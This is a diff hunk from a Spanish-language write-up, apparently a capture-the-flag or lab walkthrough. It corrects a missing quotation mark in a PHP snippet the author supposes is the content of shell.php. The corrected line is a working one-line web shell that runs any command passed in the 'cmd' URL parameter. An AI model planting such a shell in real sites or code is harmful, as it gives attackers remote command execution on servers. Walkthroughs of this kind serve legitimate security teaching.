@@ -26,7 +26,7 @@ Al entrar en  `warning .html`, nos aparece esto:
 Podemos suponer que `shell.php` luce así:
 ```php
 <?php
-	system($_GET['cmd]);
+	system($_GET['cmd']);
 ?>
 ```
 
